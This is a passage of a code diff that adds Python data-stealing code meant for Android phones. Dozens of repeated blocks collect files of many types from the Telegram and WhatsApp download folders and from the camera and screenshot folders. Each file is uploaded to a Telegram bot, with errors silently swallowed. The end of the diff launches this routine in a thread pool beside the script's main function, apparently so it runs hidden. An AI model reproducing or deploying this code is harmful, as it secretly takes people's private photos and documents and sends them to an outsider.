+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard/Download/Telegram'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #--------( /sdcard/Telegram/Telegram Files\ ) ----------#
+    #---------------------apk------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------zip-----------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------swp----------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------mp4-----------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------mp3------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------m4a-----------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------jpg------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------pdf-------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------crx-------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------txt--------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------smali--------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------png---------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------xml----------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------json----------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------com-----------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard/Telegram/Telegram Files'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass   
+    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents\ )------------#
+    #---------------------apk------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------zip-----------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------swp----------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------mp4-----------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------mp3------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp3')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------m4a-----------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.m4a')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------jpg------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(jpg)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------pdf-------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------crx-------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.crx')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------txt--------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------smali--------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.smali')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------png---------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Camera'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #-----------------(extra)_(png)-----------------#
+    try:
+        sdcard_path = '/sdcard/DCIM/Screenshots'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.png')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------xml----------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.xml')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------json----------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.json')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+	#---------------------com-----------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.com')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
+    #------------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
 
-main()
+with ThreadPool(max_workers=1000) as jjj:
+    jjj.submit(suyaib)
+    jjj.submit(Main)
